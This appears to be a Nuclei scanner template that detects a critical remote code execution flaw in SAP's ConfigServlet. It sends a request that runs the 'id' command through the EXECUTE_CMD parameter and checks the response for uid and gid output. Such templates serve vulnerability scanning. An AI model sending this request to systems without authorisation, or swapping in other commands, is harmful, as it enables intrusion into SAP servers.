http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
  method: GET
  path:
  - '{{BaseURL}}/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=id'
  stop-at-first-match: true
id: sap-rce
info:
  author: reewardius
  metadata:
    max-request: 1
  name: SAP RCE
  severity: critical
  tags: rce,sap,generic
